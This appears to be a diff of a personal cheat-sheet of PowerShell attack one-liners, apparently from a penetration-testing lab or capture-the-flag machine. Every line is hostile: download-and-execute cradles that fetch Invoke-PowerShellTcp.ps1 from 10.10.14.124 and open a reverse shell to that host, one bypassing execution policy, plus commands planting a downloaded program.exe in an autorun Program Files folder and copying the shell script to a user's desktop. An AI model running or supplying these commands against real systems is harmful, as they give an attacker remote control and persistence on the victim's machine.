@@ -1,5 +1,7 @@
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 8002
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 8002
 
+ @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.124:8000/Invoke-PowerShellTcp.ps1'))";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 4445
+ 
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8001/program.exe' -OutFILE 'C:\Program Files\Autorun Program\program.exe'"
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8001/Invoke-PowerShellTcp.ps1' -OutFILE 'C:\users\kostas\Desktop\Invoke-PowerShellTcp.ps1'"
 
